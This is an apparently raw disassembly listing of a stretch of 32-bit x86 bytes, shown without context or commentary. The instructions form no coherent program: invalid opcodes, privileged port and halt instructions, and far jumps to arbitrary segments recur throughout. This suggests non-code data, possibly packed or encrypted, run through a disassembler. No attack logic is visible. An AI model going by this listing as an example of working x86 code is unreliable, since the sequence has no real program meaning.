  4080a5:	sub    edx,esp
  4080a7:	test   eax,ebp
  4080a9:	adc    al,0xf8
  4080ab:	fwait
  4080ac:	and    BYTE PTR [edi-0x45],0x82
  4080b0:	or     cl,BYTE PTR [ecx+0x3f369f54]
  4080b6:	sbb    al,BYTE PTR [edi]
  4080b8:	sti    
  4080b9:	ds or  eax,0x84eebff7
  4080bf:	cmp    esp,esp
  4080c1:	cld    
  4080c2:	ja     0x408084
  4080c4:	div    DWORD PTR [edx]
  4080c6:	cmp    DWORD PTR [ebp-0x4b3fcc6d],ebx
  4080cc:	(bad)  
  4080cd:	push   ebp
  4080ce:	aad    0xa7
  4080d0:	mov    BYTE PTR [esi+edi*8-0x6127a831],al
  4080d7:	inc    ebx
  4080d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d9:	cmp    ebp,DWORD PTR [edx-0x33]
  4080dc:	mov    ecx,0x80ed13b0
  4080e1:	test   DWORD PTR [ebx-0x1fd7cdd8],eax
  4080e7:	inc    ebp
  4080e8:	aad    0xe5
  4080ea:	or     eax,0xd143cfa1
  4080ef:	jmp    0xd89e:0x6b7ad7b1
  4080f6:	mov    WORD PTR [edi-0x3590a1d8],cs
  4080fc:	or     eax,0x6ef5c3a4
  408101:	out    dx,eax
  408102:	inc    esi
  408103:	jno    0x4080da
  408105:	inc    esi
  408106:	cmp    BYTE PTR [edi-0x10],cl
  408109:	mov    ss,WORD PTR [ebp+0x31]
  40810c:	mov    ds:0xa3e26d54,eax
  408111:	add    ah,ah
  408113:	pop    esi
  408114:	push   cs
  408115:	jne    0x40809d
  408117:	out    0x9c,al
  408119:	shr    DWORD PTR [ebx-0x42],cl
  40811c:	xchg   ebp,eax
  40811d:	dec    esp
  40811e:	fabs   
  408120:	push   ss
  408121:	pushf  
  408122:	fsub   st,st(2)
  408124:	pushf  
  408125:	jge    0x4080c0
  408127:	fcmovnbe st,st(2)
  408129:	push   ecx
  40812a:	iret   
  40812b:	outs   dx,BYTE PTR ds:[esi]
  40812c:	mov    ebp,DWORD PTR [ecx]
  40812e:	mov    eax,ds:0xa5f27b94
  408133:	sbb    al,0xac
  408135:	adc    DWORD PTR [edx+esi*4+0x7d],ebp
  408139:	ja     0x408119
  40813b:	cmp    BYTE PTR ds:0x628758a3,ah
  408141:	add    al,BYTE PTR [ebp-0x659b0b48]
  408147:	std    
  408148:	int    0xfd
  40814a:	jecxz  0x40811a
  40814c:	fwait
  40814d:	sysenter 
  40814f:	and    edx,eax
  408151:	mov    al,0x73
  408153:	add    BYTE PTR [edi-0x2c63e7ae],cl
  408159:	rcl    BYTE PTR [ebx-0x75cb8b3c],1
  40815f:	or     bh,BYTE PTR [ecx+0x709985e9]
  408165:	int    0x29
  408167:	shl    BYTE PTR [eax+0x506693bb],cl
  40816d:	je     0x408110
  40816f:	jge    0x408186
  408171:	loope  0x408123
  408173:	call   0x4f29:0x6963213
  40817a:	push   es
  40817b:	lods   eax,DWORD PTR ds:[esi]
  40817c:	scas   eax,DWORD PTR es:[edi]
  40817d:	jmp    0xe241:0x76fb08ec
  408184:	push   edi
  408185:	cli    
  408186:	hlt    
  408187:	cli    
  408188:	loopne 0x4081ad
  40818a:	das    
  40818b:	fdivr  DWORD PTR [esi-0x24]
  40818e:	in     al,0xd3
  408190:	repnz mov WORD PTR [esi+esi*8],gs
  408194:	xor    dl,BYTE PTR [edx-0x2f]
  408197:	faddp  st(5),st
  408199:	rcl    BYTE PTR [eax*4-0x47f2dcdb],cl
  4081a0:	jge    0x40820f
  4081a2:	pop    es
  4081a3:	cmp    eax,0xcf396b67
  4081a8:	lods   al,BYTE PTR ds:[esi]
  4081a9:	cmp    dl,BYTE PTR [ebp-0x5ff69519]
  4081af:	mov    dl,0x4c
  4081b1:	or     dl,BYTE PTR [edi]
  4081b3:	dec    ebx
  4081b4:	xchg   ebp,eax
  4081b5:	xchg   ebx,eax
  4081b6:	adc    ch,ah
  4081b8:	(bad)  
  4081ba:	sbb    DWORD PTR [edi+0x55f3998c],ebx
  4081c0:	das    
  4081c1:	sahf   
  4081c2:	shr    ebp,1
  4081c4:	jge    0x4081b6
  4081c6:	fstp   st(2)
  4081c8:	sti    
  4081c9:	xor    DWORD PTR [ebp+0x6],edx
  4081cc:	fwait
  4081cd:	xor    ebp,DWORD PTR [eax]
  4081cf:	dec    eax
  4081d0:	fwait
  4081d1:	xor    edx,edx
  4081d3:	call   FWORD PTR [esi+0x4a]
  4081d6:	sti    
  4081d7:	ror    BYTE PTR [ebp+0xc],cl
  4081da:	sbb    bh,BYTE PTR [ebp-0x63c01c74]
  4081e0:	cs or  eax,0x1dd98725
  4081e6:	int3   
  4081e7:	ja     0x4081e2
  4081e9:	pop    ecx
  4081ea:	call   0x5f9c:0x5196abb4
  4081f1:	mov    ds:0xb5b4b184,eax
  4081f6:	sahf   
  4081f7:	xchg   esp,esi
  4081f9:	rcl    edx,0x4b
  4081fc:	xor    DWORD PTR [ebx],ebx
  4081fe:	mov    ecx,0xb87c145e
  408203:	cld    
  408204:	cdq    
  408205:	ror    BYTE PTR [ecx+ebx*4+0x2857db02],cl
  40820c:	out    dx,eax
  40820d:	xchg   BYTE PTR [edi+ecx*4],dh
  408210:	iret   
  408211:	jmp    0x40825f
  408213:	adc    bh,BYTE PTR [esi]
  408215:	fucomp st(2)
  408217:	add    esp,esi
  408219:	mov    ah,0xcb
  40821b:	xchg   ebx,eax
  40821c:	shl    BYTE PTR ds:0x515404a0,cl
  408222:	push   esi
  408223:	fisubr WORD PTR [edx-0x3e]
  408226:	test   BYTE PTR [edi],ah
  408228:	fcom   DWORD PTR ds:0x22eaae71
  40822e:	cdq    
  40822f:	push   ss
  408230:	inc    esi
  408231:	mov    ah,0x93
  408233:	sub    BYTE PTR [bx+0x1],dl
  408237:	mov    cl,0x36
  408239:	es scas eax,DWORD PTR es:[edi]
  40823b:	or     DWORD PTR [eax+0x170a2c],ebx
  408241:	mov    cl,0x0
  408243:	xchg   ebx,eax
  408244:	cmp    DWORD PTR [edx+0x4f5a24c8],0xd5589799
  40824e:	fisttp DWORD PTR ss:[ebp+eax*2-0x65]
  408253:	mov    bl,0xe1
  408255:	xor    DWORD PTR [edi+edi*1],0xf7ea36be
  40825c:	add    DWORD PTR [eax+ebp*2-0x225a34df],edi
  408263:	nop
  408264:	jns    0x408295
  408266:	pusha  
  408267:	mov    bl,BYTE PTR [esi-0x5b]
  40826a:	in     al,dx
  40826b:	push   esi
  40826c:	ret    
  40826d:	or     DWORD PTR [edx],edi
  40826f:	mov    BYTE PTR [ebx-0x78],ch
  408272:	and    al,0x11
  408274:	hlt    
  408275:	dec    ebp
  408276:	xchg   BYTE PTR [edi],bl
  408278:	push   0x5a
  40827a:	jmp    0x408208
  40827c:	push   es
  40827d:	shr    esp,0xcf
  408280:	xchg   edx,eax
  408281:	ja     0x408253
  408283:	jne    0x408304
  408285:	push   0xea9dca9b
  40828a:	xor    eax,0x6d09ec0b
  40828f:	sub    al,BYTE PTR [eax-0x7d]
  408292:	repz in eax,dx
  408294:	shl    DWORD PTR [ebx],cl
  408296:	cwde   
  408297:	stc    
  408298:	shr    ebx,1
  40829a:	icebp  
  40829b:	ret    0xda4c
  40829e:	push   ebx
  40829f:	cmp    eax,0x10e4bc16
  4082a4:	push   ebx
  4082a5:	popf   
  4082a6:	mov    eax,0x38dc9ba6
  4082ab:	int3   
  4082ac:	dec    ebx
  4082ad:	cmc    
  4082ae:	xor    BYTE PTR [edi+edx*1-0x12],dh
  4082b2:	jmp    0xa224:0x76a4688d
  4082b9:	and    al,0xed
  4082bb:	gs retf 0x6784
  4082bf:	fwait
  4082c0:	cmp    al,0x15
  4082c2:	sbb    ah,bh
  4082c4:	jmp    FWORD PTR [eax-0x2e9c2d20]
  4082ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082cb:	xchg   BYTE PTR [bp+di+0x2d],bh
  4082cf:	inc    esp
  4082d0:	or     eax,0x8e86c0d0
  4082d5:	jb     0x408327
  4082d7:	hlt    
  4082d8:	rol    eax,1
  4082da:	mov    dl,0x6a
  4082dc:	stos   BYTE PTR es:[edi],al
  4082dd:	sbb    BYTE PTR [esi+0x72],ch
  4082e0:	pop    DWORD PTR ds:0x698ba24f
  4082e6:	mov    esi,0x32c50a78
  4082eb:	es sub eax,0xfa92edbe
  4082f1:	mov    eax,ds:0x329c923f
  4082f6:	scas   al,BYTE PTR es:[edi]
  4082f7:	sbb    DWORD PTR [esi+ebx*1-0x33],0x1a
  4082fc:	xor    BYTE PTR [ebx],dl
  4082fe:	cld    
  4082ff:	add    cl,bl
  408301:	cmp    edx,DWORD PTR [ebx-0x64]
  408304:	push   ss
  408305:	dec    esp
  408306:	les    ebx,FWORD PTR [edx-0x58b233ef]
  40830c:	push   ebx
  40830d:	xchg   DWORD PTR [edi],edx
  40830f:	push   cs
  408310:	mov    bl,0x20
  408312:	mov    dl,0x51
  408314:	shl    DWORD PTR [esi-0x39da109d],cl
  40831a:	pusha  
  40831b:	call   0x4180d1cc
  408320:	pop    esp
  408321:	sar    BYTE PTR [esi-0x2d9d18a0],cl
  408327:	sbb    dl,BYTE PTR [esi]
  408329:	add    ecx,eax
  40832b:	dec    ebp
  40832c:	fisub  WORD PTR [esi]
  40832e:	xlat   BYTE PTR ds:[ebx]
  40832f:	in     eax,dx
  408330:	or     eax,DWORD PTR [ecx]
  408332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408333:	imul   eax,ebp,0xfc9f9414
  408339:	cmp    al,0x2f
  40833b:	cmp    esi,DWORD PTR [ebp+0x70f8d3d1]
  408341:	add    bh,ah
  408343:	ret    0x6cee
  408346:	dec    eax
  408347:	xchg   edx,eax
  408348:	push   es
  408349:	std    
  40834a:	mov    ebx,DWORD PTR [esi+0x2a25a728]
  408350:	outs   dx,BYTE PTR ds:[esi]
  408351:	arpl   WORD PTR [ebx],cx
  408353:	pop    ds
  408354:	test   bh,al
  408356:	push   0xaa792b44
  40835b:	(bad)  
  40835c:	push   eax
  40835d:	adc    eax,0x5015cb0
  408362:	mov    ah,0xe7
  408364:	out    0x14,al
  408366:	sbb    eax,0x89584c04
  40836b:	fsub   DWORD PTR [edx-0x45]
  40836e:	js     0x408348
  408370:	sahf   
  408371:	push   ss
  408372:	jle    0x4083ba
  408374:	mov    esi,0x1c0fc738
  408379:	sub    al,0x38
  40837b:	aad    0xb9
  40837d:	push   esp
  40837e:	cmp    al,0x38
  408380:	sbb    edx,DWORD PTR [edi-0x59]
  408383:	jle    0x408359
  408385:	push   0xa
  408387:	cwde   
  408388:	mov    ah,0x51
  40838a:	lahf   
  40838b:	sbb    eax,0xbb9221bd
  408390:	jnp    0x4083c9
  408392:	pushf  
  408393:	mov    dl,0x4d
  408395:	xchg   edx,eax
  408396:	(bad)  
  408397:	dec    ecx
  408398:	pop    ds
  408399:	mov    bh,0x2e
  40839b:	(bad)  
  40839d:	lods   eax,DWORD PTR ds:[esi]
  40839e:	mov    cl,0x5b
  4083a0:	pushf  
  4083a1:	sub    edx,ebp
  4083a3:	mov    WORD PTR [ecx],?
  4083a5:	push   ebp
  4083a6:	jle    0x40835b
  4083a8:	xchg   DWORD PTR [edx-0x38736aa5],ecx
  4083ae:	sar    BYTE PTR [esi],1
  4083b0:	mov    ah,0x1e
  4083b2:	cs xor eax,0x9b040943
  4083b8:	sub    edi,DWORD PTR [ebp+eax*1-0x7d]
  4083bc:	addr16 call 0x621a5519
  4083c2:	imul   edi,DWORD PTR [edx+0x4e],0x855b71f3
  4083c9:	imul   edx,esp,0x1e
  4083cc:	push   DWORD PTR [edx+0x70187cf7]
  4083d2:	mov    al,al
  4083d4:	pop    esi
  4083d5:	inc    eax
  4083d6:	stos   BYTE PTR es:[edi],al
  4083d7:	int    0x7
  4083d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083da:	xchg   ecx,eax
  4083db:	lods   eax,DWORD PTR ds:[esi]
  4083dc:	stos   DWORD PTR es:[edi],eax
  4083dd:	retf   
  4083de:	push   esi
  4083df:	xchg   edx,eax
  4083e0:	int3   
  4083e1:	add    BYTE PTR [ebx+0x3],dh
  4083e4:	test   DWORD PTR [ecx-0x43],0xf2e7addf
  4083eb:	xchg   DWORD PTR [eax+0x12],edx
  4083ee:	loope  0x4083cd
  4083f0:	push   cs
  4083f1:	iret   
  4083f2:	sbb    al,0x7d
  4083f4:	fstp   QWORD PTR [esi]
  4083f6:	push   esi
  4083f7:	jmp    0x408421
  4083f9:	cdq    
  4083fa:	xor    eax,0xf72b7445
  4083ff:	test   BYTE PTR [edx-0x258b50aa],cl
  408405:	ins    BYTE PTR es:[edi],dx
  408406:	xor    ebx,DWORD PTR [edx-0x51ec77d9]
  40840c:	pop    ebx
  40840d:	gs add al,0xd3
  408410:	scas   al,BYTE PTR es:[edi]
  408411:	mov    ebp,0xefdb1804
  408416:	shl    ah,cl
  408418:	xchg   dh,ah
  40841a:	test   al,0x9f
  40841c:	pop    esi
  40841d:	ficomp DWORD PTR [esp+esi*8]
  408420:	leave  
  408421:	push   eax
  408422:	mov    al,0xac
  408424:	pop    ss
  408425:	out    0x7a,eax
  408427:	addr16 push ecx
  408429:	inc    edx
  40842a:	add    cl,0xb9
  40842d:	stos   BYTE PTR es:[edi],al
  40842e:	add    eax,0x48390899
  408433:	or     al,0xce
  408435:	sbb    BYTE PTR [edi-0x46],dl
  408438:	jmp    0xaec:0x4713a41d
  40843f:	or     ch,dh
  408441:	cmc    
  408442:	outs   dx,DWORD PTR ds:[esi]
  408443:	and    eax,0xa86f5dbc
  408448:	lds    ecx,FWORD PTR [eax+0x57]
  40844b:	xor    eax,0xfebaeb9f
  408450:	sti    
  408451:	lock sub cl,BYTE PTR [ecx+0x20]
  408455:	stos   BYTE PTR es:[edi],al
  408456:	mov    cs,WORD PTR [edx+0x6d310474]
  40845c:	dec    ebx
  40845d:	and    ebx,DWORD PTR [eax]
  40845f:	push   edi
  408460:	xor    ebx,DWORD PTR [edx-0x6a]
  408463:	push   eax
  408464:	scas   al,BYTE PTR es:[edi]
  408465:	cs aaa 
  408467:	stc    
  408468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408469:	es (bad) 
  40846b:	and    eax,0x55ee73d3
  408470:	xor    eax,0xb9da8f33
  408475:	cmp    DWORD PTR [edx+ecx*4-0x4488c1aa],0x4d9d2216
  408480:	ret    0xeee3
  408483:	pop    ebp
  408484:	sbb    ebp,DWORD PTR [ecx+0x77]
  408487:	or     ecx,DWORD PTR [ebx+0x23]
  40848a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40848b:	lods   al,BYTE PTR ds:[esi]
  40848c:	adc    ebp,0xca5138ea
  408492:	das    
  408493:	stos   BYTE PTR es:[edi],al
  408494:	sub    DWORD PTR [edx],ebp
  408496:	cmp    edi,esi
  408498:	pop    eax
  408499:	mov    bl,0xd8
  40849b:	in     al,0x38
  40849d:	mul    BYTE PTR [ebx+edi*8]
  4084a0:	sti    
  4084a1:	ss mov ch,0x13
  4084a4:	leave  
  4084a5:	mov    eax,0x412f6773
  4084aa:	test   BYTE PTR [edi],bh
  4084ac:	sub    eax,0xaf273e14
  4084b1:	dec    esi
  4084b2:	xchg   ebx,eax
  4084b3:	pushf  
  4084b4:	mov    DWORD PTR [ebx],ebx
  4084b6:	in     al,dx
  4084b7:	cmc    
  4084b8:	jns    0x4084f7
  4084ba:	sub    esi,DWORD PTR [edi-0x2]
  4084bd:	int    0xf6
  4084bf:	mov    DWORD PTR [edx+0x32a4f9e3],edx
  4084c5:	fstp   QWORD PTR [eax]
  4084c7:	sbb    dl,BYTE PTR [eax+0x2a]
  4084ca:	jmp    0xb5a8:0x9005a6cf
  4084d1:	dec    esi
  4084d2:	dec    edi
  4084d3:	jg     0x40848c
  4084d5:	xchg   esi,eax
  4084d6:	retf   
  4084d7:	jne    0x4084b4
  4084d9:	and    BYTE PTR [eax+0x2a2e4328],0x52
  4084e0:	ror    DWORD PTR [esi-0x6e7c1280],cl
  4084e6:	and    BYTE PTR [eax-0x6160359d],dh
  4084ec:	loopne 0x408560
  4084ee:	and    dl,BYTE PTR [ecx+0x39934ac0]
  4084f4:	jle    0x40848e
  4084f6:	push   esi
  4084f7:	mov    dh,dl
  4084f9:	mov    DWORD PTR [ebx-0x5b],esi
  4084fc:	push   ebp
  4084fd:	jl     0x4084c9
  4084ff:	popf   
  408500:	cwde   
  408501:	xor    DWORD PTR [esi+0x3d],0xffffff9e
  408505:	pop    esi
  408506:	or     ebp,DWORD PTR [ebx+0x58]
  408509:	and    DWORD PTR [esi+0x57e87b64],ecx
  40850f:	pop    es
  408510:	add    ch,BYTE PTR [ecx+0x22]
  408513:	das    
  408514:	ja     0x408551
  408516:	sar    DWORD PTR ds:0xe60ba900,1
  40851c:	dec    edx
  40851d:	out    dx,al
  40851e:	test   DWORD PTR [edi-0xb],ebp
  408521:	jmp    0x40850b
  408523:	mov    fs,WORD PTR [eax+0x736db966]
  408529:	int    0xe8
  40852b:	scas   eax,DWORD PTR es:[edi]
  40852c:	outs   dx,DWORD PTR ds:[esi]
  40852d:	stos   BYTE PTR es:[edi],al
  40852e:	cdq    
  40852f:	jmp    0x40855c
  408531:	es lock stos BYTE PTR es:[edi],al
  408534:	aaa    
  408535:	out    dx,al
  408536:	imul   esp,DWORD PTR [ecx+0x56],0xffffffa1
  40853a:	mov    esi,0x8e0a87c0
  40853f:	inc    ebp
  408540:	mov    edx,0x5aaba756
  408545:	out    0xf3,al
  408547:	test   BYTE PTR [edx],bh
  408549:	repnz mov ebx,0x2449d59e
  40854f:	push   0xc6d82269
  408554:	pop    esp
  408555:	push   eax
  408556:	pop    ss
  408557:	bound  edi,QWORD PTR [edx-0x1b]
  40855a:	and    BYTE PTR [ecx+0x42],ah
  40855d:	das    
  40855e:	push   esi
  40855f:	cmp    bh,0x76
  408562:	and    al,0xb8
  408564:	(bad)  
  408565:	fsubr  QWORD PTR [ecx-0x2951df76]
  40856b:	jb     0x4085a4
  40856d:	add    esp,0xa4a33e68
  408573:	push   ecx
  408574:	outs   dx,DWORD PTR ds:[esi]
  408575:	add    ch,ah
  408577:	sbb    ecx,ebp
  408579:	pop    ebp
  40857a:	out    dx,al
  40857b:	push   es
  40857c:	cmp    al,0xf9
  40857e:	dec    esi
  40857f:	aam    0x51
  408581:	push   es
  408582:	sub    BYTE PTR [eax+0x29147108],cl
  408588:	or     al,0xbb
  40858a:	xor    BYTE PTR [ecx+eiz*8+0x64],dl
  40858e:	and    cl,dh
  408590:	lods   eax,DWORD PTR ds:[esi]
  408591:	jb     0x4085c8
  408593:	mul    esi
  408595:	xchg   edi,eax
  408596:	call   0x4c6e:0xe7890040
  40859d:	cdq    
  40859e:	adc    BYTE PTR [ebx-0x2d1d86c0],0x22
  4085a5:	cmovns ebp,edi
  4085a8:	mov    al,0xba
  4085aa:	pop    ebp
  4085ab:	popf   
  4085ac:	pop    esp
  4085ad:	or     eax,0x7c98ff82
  4085b2:	dec    esi
  4085b3:	retf   
  4085b4:	cmp    bh,bh
  4085b6:	aaa    
  4085b7:	(bad)  
  4085b8:	mov    edi,0xfc8eca33
  4085bd:	(bad)  
  4085be:	jns    0x408592
  4085c0:	loopne 0x408603
  4085c2:	lea    esi,[esi+esi*8-0x65f1db57]
  4085c9:	mov    WORD PTR [edx-0x71],es
  4085cc:	cli    
  4085cd:	or     ah,BYTE PTR [ebx]
  4085cf:	bound  eax,QWORD PTR ds:0xa72468b4
  4085d5:	xor    eax,0x45c7cb3f
  4085da:	hlt    
  4085db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085dc:	test   DWORD PTR [eax+edi*8-0x1603ba75],ebx
  4085e3:	stos   BYTE PTR es:[edi],al
  4085e4:	and    eax,DWORD PTR [eax]
  4085e6:	add    BYTE PTR ds:0x84488431,bl
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffffe5
  4085f4:	push   cs
  4085f5:	push   edx
  4085f6:	push   0x79
  4085f8:	sbb    DWORD PTR [ebx-0x7c9f0e7d],eax
  4085fe:	sbb    DWORD PTR [edx+0x51],0x14
  408602:	and    esi,edx
  408604:	adc    eax,DWORD PTR [ebx-0x74]
  408607:	inc    esp
  408608:	mov    ebp,0xad414684
  40860d:	xchg   edx,eax
  40860e:	out    0xd0,al
  408610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408611:	pop    esp
  408612:	in     eax,dx
  408613:	push   cs
  408614:	and    eax,DWORD PTR [edx+0x4197709]
  40861a:	std    
  40861b:	mov    eax,0xf35e56d2
  408620:	cwde   
  408621:	push   edx
  408622:	xor    cl,cl
  408624:	nop
  408625:	inc    ebx
  408626:	stos   BYTE PTR es:[edi],al
  408627:	xchg   ebx,eax
  408628:	mov    edi,DWORD PTR [eax]
  40862a:	sub    esi,DWORD PTR [ebx+0xa8dfe86]
  408630:	inc    ebp
  408631:	ror    DWORD PTR gs:[ebx-0x57498776],0xae
  408639:	jl     0x40868f
  40863b:	and    eax,0xecd00e1c
  408640:	add    ah,BYTE PTR [esi]
  408642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408643:	dec    ebp
  408644:	sub    ax,0x2b12
  408648:	push   edx
  408649:	push   0x3be257aa
  40864e:	popa   
  40864f:	fwait
  408650:	xor    BYTE PTR [eax+0x68],dl
  408653:	mov    DWORD PTR [esi],ecx
  408655:	test   eax,0x6c8f3da4
  40865a:	add    edx,DWORD PTR [ebp+esi*2+0x5d3879fd]
  408661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408662:	sbb    esp,ecx
  408664:	pop    esi
  408665:	int    0x76
  408667:	xchg   edx,eax
  408668:	mov    DWORD PTR [ecx],edi
  40866a:	xor    bl,cl
  40866c:	and    bl,BYTE PTR [ecx]
  40866e:	aas    
  40866f:	dec    edi
  408670:	sbb    BYTE PTR [eax],ah
  408672:	test   al,0x79
  408674:	nop
  408675:	sbb    ebx,DWORD PTR [edi-0x4e]
  408678:	mov    eax,ebx
  40867a:	out    dx,al
  40867b:	push   eax
  40867c:	push   ebp
  40867d:	jl     0x40864b
  40867f:	push   edi
  408680:	sub    bl,dl
  408682:	int3   
  408683:	xor    DWORD PTR [eax],esi
  408685:	test   al,0x77
  408687:	and    al,0x3d
  408689:	std    
  40868a:	lods   al,BYTE PTR ds:[esi]
  40868b:	cmp    ecx,0xffffffed
  40868e:	inc    edi
  40868f:	pop    ebp
  408690:	mov    ds:0x3aabdae0,al
  408695:	pop    edi
  408696:	push   esp
  408697:	mov    esp,0x8478e918
  40869c:	sub    eax,0x6c9dae4b
  4086a1:	pop    ds
  4086a2:	repz xor ebx,DWORD PTR [eax-0x5ba8cccf]
  4086a9:	test   al,0x8e
  4086ab:	ss jcxz 0x40870a
  4086af:	jg     0x40869b
  4086b1:	pop    es
  4086b2:	push   es
  4086b3:	push   edi
  4086b4:	mov    eax,0x91a95cf4
  4086b9:	pop    edx
  4086ba:	test   al,0x9f
  4086bc:	(bad)  
  4086bd:	jae    0x408641
  4086bf:	cwde   
  4086c0:	hlt    
  4086c1:	sub    al,0x5
  4086c3:	mov    eax,0x7a7e2d02
  4086c8:	(bad)  
  4086c9:	jns    0x4086eb
  4086cb:	pushf  
  4086cc:	cmp    eax,0x95565a5d
  4086d1:	call   0x66a5:0x76c13b2a
  4086d8:	fidiv  DWORD PTR [ecx]
  4086da:	mov    ds:0xb4bf587d,eax
  4086df:	sbb    eax,DWORD PTR [ecx]
  4086e1:	sar    BYTE PTR [ecx+0x70],1
  4086e4:	out    dx,al
  4086e5:	jnp    0x4086b2
  4086e7:	mov    bl,0x40
  4086e9:	add    eax,0x57fcf0c9
  4086ee:	aas    
  4086ef:	clc    
  4086f0:	sub    DWORD PTR [esi-0x4b4b5c99],0x48
  4086f7:	adc    BYTE PTR [ebx],ah
  4086f9:	xchg   ebx,eax
  4086fa:	(bad)  
  4086fb:	push   ss
  4086fc:	and    dl,dl
  4086fe:	lahf   
  4086ff:	mov    WORD PTR [esi+0x30],ds
  408702:	enter  0x4555,0x4c
  408706:	int    0xd4
  408708:	pushf  
  408709:	fucom  st(3)
  40870b:	dec    ecx
  40870c:	mov    BYTE PTR [edx+0x1d857b0],bl
  408712:	out    0xad,eax
  408714:	mov    ah,0x4f
  408716:	fbld   TBYTE PTR [esi]
  408718:	xchg   ecx,eax
  408719:	xlat   BYTE PTR ds:[ebx]
  40871a:	sbb    al,0x2
  40871c:	inc    edi
  40871d:	mov    bl,0xd3
  40871f:	adc    eax,0xe52c836f
  408724:	icebp  
  408725:	push   ebx
  408726:	xchg   esi,eax
  408727:	shl    DWORD PTR [esi-0x7c],1
  40872a:	mov    esp,esi
  40872c:	or     esp,DWORD PTR ds:0xdf848ace
  408732:	pop    ds
  408733:	add    al,0x42
  408735:	mov    edi,0x97c5f04
  40873a:	xor    eax,DWORD PTR [eax+0x53]
  40873d:	cmp    BYTE PTR [esi],0xf8
  408740:	fmul   st,st(2)
  408742:	add    BYTE PTR [edx],bh
  408744:	hlt    
  408745:	popa   
  408746:	stos   BYTE PTR es:[edi],al
  408747:	sbb    eax,0xa871b7e0
  40874c:	js     0x408706
  40874e:	sub    BYTE PTR [eax],dh
  408750:	xchg   edi,eax
  408751:	push   0x1a
  408753:	dec    eax
  408754:	(bad)  
  408756:	shl    bl,1
  408758:	mov    bl,0x33
  40875a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40875b:	outs   dx,DWORD PTR ds:[esi]
  40875c:	gs cmp ebp,ebx
  40875f:	in     eax,dx
  408760:	fist   WORD PTR [esi]
  408762:	scas   al,BYTE PTR es:[edi]
  408763:	sbb    bl,BYTE PTR [edx-0x76]
  408766:	and    bl,ah
  408768:	seto   BYTE PTR [ebx+0x4a2a9f70]
  40876f:	jne    0x408785
  408771:	lds    esp,FWORD PTR [ecx+0x36e252b6]
  408777:	inc    esi
  408778:	gs fyl2x 
  40877b:	cdq    
  40877c:	or     eax,0x52e41387
  408781:	xchg   ecx,eax
  408782:	(bad)  
  408783:	mov    eax,ds:0x586875a5
  408788:	push   cs
  408789:	das    
  40878a:	sbb    esi,DWORD PTR [edx-0x12]
  40878d:	jl     0x40879c
  40878f:	shr    bh,cl
  408791:	mov    al,0x5b
  408793:	mov    ecx,0x1eedafd4
  408798:	push   edx
  408799:	sbb    al,0xfb
  40879b:	sbb    ebx,DWORD PTR [ebx+0x70e065ed]
  4087a1:	loop   0x4087ad
  4087a3:	aad    0x18
  4087a5:	(bad)  
  4087a7:	(bad)  
  4087a8:	and    eax,0x6fe939fd
  4087ad:	lock dec ebx
  4087af:	cmp    esi,DWORD PTR [ecx-0x24e87e3c]
  4087b5:	sub    al,0x32
  4087b7:	adc    al,0x8a
  4087b9:	xchg   BYTE PTR [eax],bh
  4087bb:	sbb    al,0x83
  4087bd:	mov    eax,ds:0x9979efd3
  4087c2:	add    al,0xa4
  4087c4:	xor    al,0xaa
  4087c6:	dec    esi
  4087c7:	dec    ecx
  4087c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087c9:	ret    
  4087ca:	jmp    0x99c6410e
  4087cf:	mov    bh,0x8c
  4087d1:	cwde   
  4087d2:	clc    
  4087d3:	test   dl,ch
  4087d5:	mov    ch,0x2
  4087d7:	mov    bl,0x2d
  4087d9:	aas    
  4087da:	push   0xfc9b7641
  4087df:	enter  0x7b9f,0xbb
  4087e3:	popa   
  4087e4:	cmovg  ecx,DWORD PTR [ecx+0x4a]
  4087e8:	ss push esi
  4087ea:	xor    eax,0xe9e269ee
  4087ef:	fmul   QWORD PTR [esi-0x70]
  4087f2:	sub    dl,BYTE PTR [eax]
  4087f4:	cmp    al,0x2
  4087f6:	jmp    0x17bbff8d
  4087fb:	xchg   esi,eax
  4087fc:	test   eax,0x6d45207
  408801:	mov    eax,DWORD PTR [edx-0x78]
  408804:	xchg   esi,eax
  408805:	leave  
  408806:	dec    esi
  408807:	xor    al,BYTE PTR [ebx]
  408809:	pop    esi
  40880a:	jmp    0x408833
  40880c:	fcmove st,st(3)
  40880e:	retf   0x44
  408811:	mov    dh,0xf4
  408813:	lea    edx,[edi+0x54]
  408816:	xor    eax,0x3aaf815e
  40881b:	xchg   BYTE PTR [edi-0x13],cl
  40881e:	fdiv   DWORD PTR [ebp+0x36a3aec9]
  408824:	arpl   WORD PTR [edi+0x4],ax
  408827:	pop    eax
  408828:	(bad)  
  40882a:	(bad)  
  40882b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40882c:	xchg   esp,eax
  40882d:	bound  eax,QWORD PTR [edx-0x22]
  408830:	xor    cl,BYTE PTR [ecx+ebp*4+0x6e9dbc1c]
  408837:	imul   edx,DWORD PTR [esi+0x6dde6ccc],0x54
  40883e:	pop    eax
  40883f:	or     BYTE PTR [edx+0xc01c1a8],0x61
  408846:	xchg   ecx,eax
  408847:	adc    BYTE PTR [ebx],ch
  408849:	xchg   esp,eax
  40884a:	and    ebx,esi
  40884c:	in     eax,dx
  40884d:	mov    WORD PTR [esp+edx*1],fs
  408850:	scas   al,BYTE PTR es:[edi]
  408851:	jl     0x4088ae
  408853:	adc    al,BYTE PTR [ecx+0xe2faa73]
  408859:	dec    esp
  40885a:	int3   
  40885b:	jmp    0x64146322
  408860:	and    al,dl
  408862:	aad    0x25
  408864:	mov    ds:0xa4fe550c,al
  408869:	les    edx,FWORD PTR [ebx]
  40886b:	mov    eax,ds:0xe9c073be
  408870:	mov    BYTE PTR [edx-0x1864d9a7],cl
  408876:	mov    ch,0x77
  408878:	outs   dx,DWORD PTR ds:[esi]
  408879:	xor    ah,BYTE PTR ds:[eax]
